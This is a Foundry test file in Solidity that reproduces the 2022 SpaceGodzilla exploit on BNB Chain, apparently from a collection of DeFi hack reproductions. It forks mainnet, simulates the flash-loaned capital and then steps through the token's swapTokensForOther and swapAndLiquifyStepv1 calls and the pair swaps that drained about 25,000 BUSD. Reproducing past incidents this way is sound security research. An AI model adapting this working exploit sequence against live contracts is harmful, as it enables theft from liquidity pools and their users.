// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

import {BlockLoader} from "./QueryBlockchain.sol";

/* @KeyInfo - Total Lost : 25,378 BUSD
    Attacker Wallet : https://bscscan.com/address/0x00a62eb08868ec6feb23465f61aa963b89e57e57
    Attack Contract : https://bscscan.com/address/0x3d817ea746edd02c088c4df47c0ece0bd28dcd72
    SpaceGodzilla : https://bscscan.com/address/0x2287c04a15bb11ad1358ba5702c1c95e2d13a5e0
    Attack Tx : https://bscscan.com/tx/0x7f183df11f1a0225b5eb5bb2296b5dc51c0f3570e8cc15f0754de8e6f8b4cca4*/

/* @News
    BlockSec : https://mobile.twitter.com/BlockSecTeam/status/1547456591900749824
    PANews : https://www.panewslab.com/zh_hk/articledetails/u25j5p3kdvu9.html*/

/* @Reports
    Numen Cyber Labs : https://medium.com/numen-cyber-labs/spacegodzilla-attack-event-analysis-d29a061b17e1
    Learnblockchain.cn Analysis : https://learnblockchain.cn/article/4396
    Learnblockchain.cn Analysis : https://learnblockchain.cn/article/4395*/

/*  We skipped the part where the attacker made a flashloan with 16 pools to get the initial capital
Here are the pools that attacker borrowed:
address constant pool1 = 0x203e062964500808151E069Eda017097E510B710;    // BUSD/GERA Pool
address constant pool2 = 0x535Ae122657E5F17FB03540A98BF9F494a06e2A4;    // BUSD/BABBC Pool
address constant pool3 = 0xa91E7d767FFdbFF64a955f32E8E3F08AfaB3047b;    // WBNB/Fei Pool
address constant pool4 = 0x0e15e47C3DE9CD92379703cf18251a2D13E155A7;    // DBTC/USDT Pool
address constant pool5 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;    // TUF/USDT Pool
address constant pool6 = 0x8A1C25e382B80E7860DB1ae619E1Fc92a0cd7104;    // FREY/USDT Pool
address constant pool7 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;    // Leek/USDT Pool
address constant pool8 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;    // CC/BUSD Pool
address constant pool9 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;    // ASET/USDT Pool
address constant pool10 = 0xb19265426ce5bC1E015C0c503dFe6EF7c407a406;   // USX/BUSD Pool
address constant pool11 = 0xe3C58d202D4047Ba227e437b79871d51982deEb7;   // BTCB/BUSD Pool   DSPFlashLoanCall
address constant pool12 = 0x9BA8966B706c905E594AcbB946Ad5e29509f45EB;   // ETH/BUSD Pool    DPPFlashLoanCall
address constant pool13 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;   // WBNB/USDT Pool   DPPFlashLoanCall
address constant pool14 = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;   // WBNB/BUSD Pool   DPPFlashLoanCall
address constant pool15 = 0x409E377A7AfFB1FD3369cfc24880aD58895D1dD9;   // ANTEX/BUSD Pool
address constant pool16 = 0xD534fAE679f7F02364D177E9D44F1D15963c0Dd7;   // DODO/WBNB Pool*/

interface ISpaceGodzilla is IERC20 {
    function swapAndLiquifyStepv1() external;

    function swapTokensForOther(uint256 tokenAmount) external;
}

contract AttackContract is Test, BlockLoader {
    CheatCodes constant cheat =
        CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniswapV2Pair pair = IUniswapV2Pair(0x8AfF4e8d24F445Df313928839eC96c4A618a91C8); // SpaceGodzilla/USDT LP Pool
    ISpaceGodzilla sgz =
        ISpaceGodzilla(0x2287C04a15bb11ad1358BA5702C1C95E2D13a5E0);
    IUniswapV2Router router =
        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    uint256 flashAmount = 2_952_797_730_003_166_405_412_733;

    function setUp() public {
        cheat.createSelectFork("bsc", 19_523_980); // Fork BSC mainnet at block 19523981
        cheat.label(address(this), "AttackContract");
        cheat.label(address(usdt), "USDT");
        cheat.label(address(pair), "Pair");
        cheat.label(address(sgz), "SpaceGodzilla");

        emit log_string(
            "This reproduce shows how attacker exploit SpaceGodzilla, cause 25,378 BUSD lost"
        );
        emit log_string(
            "[Note] We skipped the part where the attacker made a flash loan with 16 pools to get the initial capital"
        );

        // Attacker flashloan 16 pools, to borrow 2.95 millon USDT as initial capital
        deal(address(usdt), address(this), flashAmount);

        testExploit();
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(sgz), address(pair), sgz.decimals());
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(this),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(sgz), address(this), sgz.decimals());
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function testExploit() public {
        uint256 init_capital = usdt.balanceOf(address(this));
        // ========================================================
        ISpaceGodzilla(sgz).swapTokensForOther(
            69_127_461_036_369_179_405_415_017_714
        );
        printBalance("After swapTokensForOther");

        // ========================================================
        (uint256 r0, uint256 r1, ) = pair.getReserves();
        assert(r0 == 76_041_697_635_825_849_047_705_725_848_735);
        assert(r1 == 90_478_604_689_102_338_898_952);
        uint256 usdt_balance = usdt.balanceOf(address(this));
        uint256 trans_usdt_balance = usdt_balance - 100_000;
        bool suc = usdt.transfer(address(pair), trans_usdt_balance);
        uint256 amount0Out = r0 - ((r0 * 30) / 1000);
        pair.swap(amount0Out, 0, address(this), "");
        printBalance("After swap0");

        // ========================================================
        ISpaceGodzilla(sgz).swapAndLiquifyStepv1();
        printBalance("After swapAndLiquifyStepv1");

        // ========================================================
        sgz.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(sgz);
        path[1] = address(usdt);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sgz.balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp
        );
        printBalance("After swap1");

        // ========================================================
        uint256 after_capital = usdt.balanceOf(address(this));
        uint256 profit = after_capital - init_capital;
        emit log_named_decimal_uint(
            "[Profit] Attacker Wallet USDT Profit",
            profit,
            18
        );
    }

    receive() external payable {}
}
